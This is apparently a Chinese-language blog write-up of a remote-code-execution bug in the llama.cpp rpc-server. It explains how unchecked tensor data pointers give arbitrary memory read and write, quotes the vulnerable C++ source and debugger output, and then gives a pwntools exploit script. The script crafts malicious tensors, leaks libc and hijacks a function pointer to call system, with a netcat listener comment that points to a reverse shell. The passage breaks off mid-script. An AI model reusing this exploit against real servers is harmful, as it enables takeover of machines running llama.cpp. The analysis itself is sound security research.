<p>然后创建一个临时的 ctx，并且对输入的 tensor 反序列化。deserialize_tensor 会把 tensor 中的一些字段拷贝到 result 中，这里需要注意的是 deserialize_tensor 会检测 <code>result-&gt;buffer</code> 是否在 buffers 中，不在则会返回 nullptr，所以 buffer 必须是一个合法的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ggml_tensor * <span class="title">rpc_server::deserialize_tensor</span><span class="params">(<span class="keyword">struct</span> ggml_context * ctx, <span class="type">const</span> rpc_tensor * tensor)</span> </span>&#123;</span><br><span class="line">    ggml_tensor * result = <span class="built_in">ggml_new_tensor_4d</span>(ctx, (ggml_type) tensor-&gt;type,</span><br><span class="line">        tensor-&gt;ne[<span class="number">0</span>], tensor-&gt;ne[<span class="number">1</span>], tensor-&gt;ne[<span class="number">2</span>], tensor-&gt;ne[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; GGML_MAX_DIMS; i++) &#123;</span><br><span class="line">        result-&gt;nb[i] = tensor-&gt;nb[i];</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;buffer = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">ggml_backend_buffer_t</span>&gt;(tensor-&gt;buffer);</span><br><span class="line">    <span class="keyword">if</span> (result-&gt;buffer &amp;&amp; buffers.<span class="built_in">find</span>(result-&gt;buffer) == buffers.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;op = (ggml_op) tensor-&gt;op;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; GGML_MAX_OP_PARAMS / <span class="built_in">sizeof</span>(<span class="type">int32_t</span>); i++) &#123;</span><br><span class="line">        result-&gt;op_params[i] = tensor-&gt;op_params[i];</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;flags = tensor-&gt;flags;</span><br><span class="line">    result-&gt;data = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(tensor-&gt;data);</span><br><span class="line">    <span class="built_in">ggml_set_name</span>(result, tensor-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么 buffers 中的元素是怎么来的？在 <code>rpc_server::alloc_buffer</code> 中会根据 size 申请一个 buffer 插入到 buffers 集合里。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">rpc_server::alloc_buffer</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; input, std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; output)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// input serialization format: | size (8 bytes) |</span></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="built_in">size</span>() != <span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;size, input.<span class="built_in">data</span>(), <span class="built_in">sizeof</span>(size));</span><br><span class="line">    <span class="type">ggml_backend_buffer_type_t</span> buft = <span class="built_in">ggml_backend_get_default_buffer_type</span>(backend);</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> buffer = <span class="built_in">ggml_backend_buft_alloc_buffer</span>(buft, size);</span><br><span class="line">    <span class="type">uint64_t</span> remote_ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> remote_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (buffer != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        remote_ptr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint64_t</span>&gt;(buffer);</span><br><span class="line">        remote_size = buffer-&gt;size;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; remote_ptr: %&quot;</span> PRIx64 <span class="string">&quot;, remote_size: %&quot;</span> PRIu64 <span class="string">&quot;\n&quot;</span>, __func__, size, remote_ptr, remote_size);</span><br><span class="line">        buffers.<span class="built_in">insert</span>(buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; failed\n&quot;</span>, __func__, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// output serialization format: | remote_ptr (8 bytes) | remote_size (8 bytes) |</span></span><br><span class="line">    output.<span class="built_in">resize</span>(<span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(output.<span class="built_in">data</span>(), &amp;remote_ptr, <span class="built_in">sizeof</span>(remote_ptr));</span><br><span class="line">    <span class="built_in">memcpy</span>(output.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(<span class="type">uint64_t</span>), &amp;remote_size, <span class="built_in">sizeof</span>(remote_size));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ggml-backend-tensor-get"><a href="#ggml-backend-tensor-get" class="headerlink" title="ggml_backend_tensor_get"></a>ggml_backend_tensor_get</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">void</span> <span class="title">ggml_backend_tensor_get</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * tensor, <span class="type">void</span> * data, <span class="type">size_t</span> offset, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> buf = tensor-&gt;view_src ? tensor-&gt;view_src-&gt;buffer : tensor-&gt;buffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(buf != <span class="literal">NULL</span> &amp;&amp; <span class="string">&quot;tensor buffer not set&quot;</span>);</span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(tensor-&gt;data != <span class="literal">NULL</span> &amp;&amp; <span class="string">&quot;tensor not allocated&quot;</span>);</span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(offset + size &lt;= <span class="built_in">ggml_nbytes</span>(tensor) &amp;&amp; <span class="string">&quot;tensor read out of bounds&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf-&gt;iface.<span class="built_in">get_tensor</span>(buf, tensor, data, offset, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">GGML_CALL <span class="type">static</span> <span class="type">void</span> <span class="title">ggml_backend_cpu_buffer_get_tensor</span><span class="params">(<span class="type">ggml_backend_buffer_t</span> buffer, <span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * tensor, <span class="type">void</span> * data, <span class="type">size_t</span> offset, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(data, (<span class="type">const</span> <span class="type">char</span> *)tensor-&gt;data + offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GGML_UNUSED</span>(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只对 <code>offset + size &lt;= ggml_nbytes(tensor)</code> 进行了检测，然后就调用了 <code>buf-&gt;iface.get_tensor</code> 拷贝数据。完全没有考虑 data 和 buffer 字段是否合法性。所以我们只要构造一个能通过检查的 buffer 字段，修改 data 就能实现任意地址读写了。</p>
<p>作者在这里直接告诉了我们 <code>buf-&gt;iface.set_tensor</code> 执行的是 <code>ggml_backend_cpu_buffer_get_tensor</code> 函数，那 iface 又是怎么分配的？让我们回到 <code>rpc_server::alloc_buffer</code>，可以看到调用了 <code>ggml_backend_get_default_buffer_type</code> 获取默认的 buft，然后后执行 <code>ggml_backend_buft_alloc_buffer</code> 分配 buffer。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ggml_backend_buffer_type_t</span> buft = <span class="built_in">ggml_backend_get_default_buffer_type</span>(backend);</span><br><span class="line"><span class="type">ggml_backend_buffer_t</span> buffer = <span class="built_in">ggml_backend_buft_alloc_buffer</span>(buft, size);</span><br></pre></td></tr></table></figure>

<p>ggml_backend_get_default_buffer_type 会返回一个静态的 ggml_backend_buffer_type 结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">ggml_backend_buffer_type_t</span> <span class="title">ggml_backend_cpu_buffer_type</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">ggml_backend_buffer_type</span> ggml_backend_cpu_buffer_type = &#123;</span><br><span class="line">        <span class="comment">/* .iface = */</span> &#123;</span><br><span class="line">            <span class="comment">/* .get_name         = */</span> ggml_backend_cpu_buffer_type_get_name,</span><br><span class="line">            <span class="comment">/* .alloc_buffer     = */</span> ggml_backend_cpu_buffer_type_alloc_buffer,</span><br><span class="line">            <span class="comment">/* .get_alignment    = */</span> ggml_backend_cpu_buffer_type_get_alignment,</span><br><span class="line">            <span class="comment">/* .get_max_size     = */</span> <span class="literal">NULL</span>, <span class="comment">// defaults to SIZE_MAX</span></span><br><span class="line">            <span class="comment">/* .get_alloc_size   = */</span> <span class="literal">NULL</span>, <span class="comment">// defaults to ggml_nbytes</span></span><br><span class="line">            <span class="comment">/* .is_host          = */</span> ggml_backend_cpu_buffer_type_is_host,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/* .context = */</span> <span class="literal">NULL</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;ggml_backend_cpu_buffer_type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此 <code>ggml_backend_buft_alloc_buffer</code> 调用的是 <code>ggml_backend_cpu_buffer_type_alloc_buffer</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">ggml_backend_buffer_t</span> <span class="title">ggml_backend_buft_alloc_buffer</span><span class="params">(<span class="type">ggml_backend_buffer_type_t</span> buft, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buft-&gt;iface.<span class="built_in">alloc_buffer</span>(buft, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">GGML_CALL <span class="type">static</span> <span class="type">ggml_backend_buffer_t</span> <span class="title">ggml_backend_cpu_buffer_type_alloc_buffer</span><span class="params">(<span class="type">ggml_backend_buffer_type_t</span> buft, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    size += TENSOR_ALIGNMENT;   <span class="comment">// malloc may return an address that is not aligned</span></span><br><span class="line">    <span class="type">void</span> * data = <span class="built_in">malloc</span>(size); <span class="comment">// <span class="doctag">TODO:</span> use GGML_ALIGNED_MALLOC (move to ggml-impl.h)</span></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s: failed to allocate buffer of size %zu\n&quot;</span>, __func__, size);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ggml_backend_buffer_init</span>(buft, cpu_backend_buffer_i, data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分配 heap 到 data 指针后，通过 ggml_backend_buffer_init 初始化成 ggml_backend_buffer 后返回。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(*buffer) = (struct ggml_backend_buffer) &#123;</span><br><span class="line">    /* .interface = */ iface,</span><br><span class="line">    /* .buft      = */ buft,</span><br><span class="line">    /* .context   = */ context,</span><br><span class="line">    /* .size      = */ size,</span><br><span class="line">    /* .usage     = */ GGML_BACKEND_BUFFER_USAGE_ANY</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最终的 buffer 结构是这个样子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *buffer</span><br><span class="line">$1 = &#123;</span><br><span class="line">  iface = &#123;</span><br><span class="line">    get_name = 0x7f012b105570 &lt;ggml_backend_cpu_buffer_name&gt;,</span><br><span class="line">    free_buffer = 0x7f012b1055d0 &lt;ggml_backend_cpu_buffer_free_buffer&gt;,</span><br><span class="line">    get_base = 0x7f012b105580 &lt;ggml_backend_cpu_buffer_get_base&gt;,</span><br><span class="line">    init_tensor = 0x0,</span><br><span class="line">    set_tensor = 0x7f012b105660 &lt;ggml_backend_cpu_buffer_set_tensor&gt;,</span><br><span class="line">    get_tensor = 0x7f012b105680 &lt;ggml_backend_cpu_buffer_get_tensor&gt;,</span><br><span class="line">    cpy_tensor = 0x7f012b105fd0 &lt;ggml_backend_cpu_buffer_cpy_tensor&gt;,</span><br><span class="line">    clear = 0x7f012b105640 &lt;ggml_backend_cpu_buffer_clear&gt;,</span><br><span class="line">    reset = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  buft = 0x7f012b199ba0 &lt;ggml_backend_cpu_buffer_type&gt;,</span><br><span class="line">  context = 0x555a0cfc0430,</span><br><span class="line">  size = 288,</span><br><span class="line">  usage = GGML_BACKEND_BUFFER_USAGE_ANY</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *buffer.buft</span><br><span class="line">$2 = &#123;</span><br><span class="line">  iface = &#123;</span><br><span class="line">    get_name = 0x7f012b105bf0 &lt;ggml_backend_cpu_buffer_type_get_name&gt;,</span><br><span class="line">    alloc_buffer = 0x7f012b105d30 &lt;ggml_backend_cpu_buffer_type_alloc_buffer&gt;,</span><br><span class="line">    get_alignment = 0x7f012b1055a0 &lt;ggml_backend_cpu_buffer_type_get_alignment&gt;,</span><br><span class="line">    get_max_size = 0x0,</span><br><span class="line">    get_alloc_size = 0x0,</span><br><span class="line">    is_host = 0x7f012b1055b0 &lt;ggml_backend_cpu_buffer_type_is_host&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  context = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="任意地址写漏洞"><a href="#任意地址写漏洞" class="headerlink" title="任意地址写漏洞"></a>任意地址写漏洞</h3><p>调用的是 <code>rpc_server::set_tensor</code>，成因和任意地址写基本一样，不再赘述。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据前面的分析，我们修改 data 就能实现任意地址读写，并且 alloc_buffer 还贴心给了 buffer 的地址，所以先考虑读 heap 上的内容。看了一圈 heap 中的内容，只能找到 ggml 的地址可以泄露。</p>
<p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/cbdf4f523325440a022887dd199e20f1.png"></p>
<p>然后利用 ggml.so 中已经链接到真实地址的 got 表，我们还可以泄露出 libc 地址，然后修改堆上的 <code>buft-&gt;iface</code>，最后通过 <code>BUFFER_CLEAR</code> 触发 system</p>
<p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/f2239d696b2753882da6db506a2db547.png">​</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># nc -lvnp 9001</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;./build/bin/rpc-server&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ggml_so = ELF(<span class="string">&quot;/share/llama.cpp/llama-b3560/build/ggml/src/libggml.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.binary = binary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOC_BUFFER = <span class="number">0</span></span><br><span class="line">GET_ALIGNMENT = <span class="number">1</span></span><br><span class="line">GET_MAX_SIZE = <span class="number">2</span></span><br><span class="line">BUFFER_GET_BASE = <span class="number">3</span></span><br><span class="line">FREE_BUFFER = <span class="number">4</span></span><br><span class="line">BUFFER_CLEAR = <span class="number">5</span></span><br><span class="line">SET_TENSOR = <span class="number">6</span></span><br><span class="line">GET_TENSOR = <span class="number">7</span></span><br><span class="line">COPY_TENSOR = <span class="number">8</span></span><br><span class="line">GRAPH_COMPUTE = <span class="number">9</span></span><br><span class="line">GET_DEVICE_MEMORY = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">io: remote, cmd: <span class="built_in">int</span>, buf: <span class="built_in">bytes</span></span>):</span><br><span class="line">    packet = p8(cmd)         <span class="comment"># cmd, 1 byte</span></span><br><span class="line">    packet += p64(<span class="built_in">len</span>(buf))  <span class="comment"># msg size, 8 bytes</span></span><br><span class="line">    packet += buf            <span class="comment"># content, size of the buffer you want to allocate</span></span><br><span class="line">    io.send(packet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc_buffer</span>(<span class="params">io: remote, size: <span class="built_in">int</span></span>):</span><br><span class="line">    send_cmd(io, ALLOC_BUFFER, p64(size))</span><br><span class="line">    recv = p.recvn(<span class="number">0x8</span> + <span class="number">0x10</span>)</span><br><span class="line">    ptr = u64(recv[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">    sz = u64(recv[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">    log.info(<span class="string">f&quot;remote_ptr: <span class="subst">&#123;<span class="built_in">hex</span>(ptr)&#125;</span>, remote_size: <span class="subst">&#123;sz&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ptr, sz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_buffer</span>(<span class="params">io: remote, remote_ptr</span>):</span><br><span class="line">    send_cmd(io, FREE_BUFFER, p64(remote_ptr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_buffer</span>(<span class="params">io: remote, remote_ptr, value=<span class="number">0x00</span></span>):</span><br><span class="line">    send_cmd(io, BUFFER_CLEAR, p64(remote_ptr) + p8(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_read</span>(<span class="params">io: remote, valid_buffer_addr: <span class="built_in">int</span>, target_addr: <span class="built_in">int</span>, leak_size: <span class="built_in">int</span></span>):</span><br><span class="line">    rpc_tensor_pd = flat([</span><br><span class="line">        <span class="number">0x1</span>,  <span class="comment"># id</span></span><br><span class="line">        p32(<span class="number">2</span>),  <span class="comment"># type</span></span><br><span class="line">        p64(valid_buffer_addr),  <span class="comment"># buffer</span></span><br><span class="line">        [p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>),],  <span class="comment"># ne</span></span><br><span class="line">        [p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>),],  <span class="comment"># nb</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># op</span></span><br><span class="line">        [p32(<span class="number">0</span>)] * <span class="number">16</span>,  <span class="comment"># op_params (corrected from 8 to 16)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># flags</span></span><br><span class="line">        [p64(<span class="number">0</span>)] * <span class="number">10</span>,  <span class="comment"># src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_offs</span></span><br><span class="line">        p64(target_addr),  <span class="comment"># data</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>,  <span class="comment"># name</span></span><br><span class="line">        <span class="string">&#x27;x&#x27;</span> * <span class="number">4</span>  <span class="comment"># padding</span></span><br><span class="line">    ])</span><br><span class="line">    content = rpc_tensor_pd</span><br><span class="line">    content += p64(<span class="number">0</span>)  <span class="comment"># offset</span></span><br><span class="line">    content += p64(leak_size)  <span class="comment"># size</span></span><br><span class="line">    send_cmd(io, GET_TENSOR, content)</span><br><span class="line">    size = u64(p.recv(<span class="number">0x8</span>))</span><br><span class="line">    <span class="keyword">return</span> p.recv(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">io: remote, valid_buffer_addr: <span class="built_in">int</span>, target_addr: <span class="built_in">int</span>, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    rpc_tensor_pd = flat([</span><br><span class="line">        <span class="number">0x1</span>,  <span class="comment"># id</span></span><br><span class="line">        p32(<span class="number">2</span>),  <span class="comment"># type</span></span><br><span class="line">        p64(valid_buffer_addr),  <span class="comment"># buffer</span></span><br><span class="line">        [p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>),],  <span class="comment"># ne</span></span><br><span class="line">        [p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>),],  <span class="comment"># nb</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># op</span></span><br><span class="line">        [p32(<span class="number">0</span>)] * <span class="number">16</span>,  <span class="comment"># op_params (corrected from 8 to 16)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># flags</span></span><br><span class="line">        [p64(<span class="number">0</span>)] * <span class="number">10</span>,  <span class="comment"># src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_offs</span></span><br><span class="line">        p64(target_addr),  <span class="comment"># data</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>,  <span class="comment"># name</span></span><br><span class="line">        <span class="string">&#x27;x&#x27;</span> * <span class="number">4</span>  <span class="comment"># padding</span></span><br><span class="line">    ])</span><br><span class="line">    content = rpc_tensor_pd</span><br><span class="line">    content += p64(<span class="number">0</span>)  <span class="comment"># offset</span></span><br><span class="line">    content += data</span><br><span class="line">    send_cmd(io, SET_TENSOR, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">50052</span>)</span><br><span class="line">remote_ptr, _ = alloc_buffer(p, <span class="number">0x100</span>)</span><br><span class="line">buffer_ptr = remote_ptr + (<span class="number">0xf0</span> - <span class="number">0x60</span>)</span><br><span class="line">leak_addr = remote_ptr + <span class="number">0x80</span></span><br><span class="line">log.info(<span class="string">f&quot;buffer_ptr: <span class="subst">&#123;<span class="built_in">hex</span>(buffer_ptr)&#125;</span>&quot;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = remote(<span 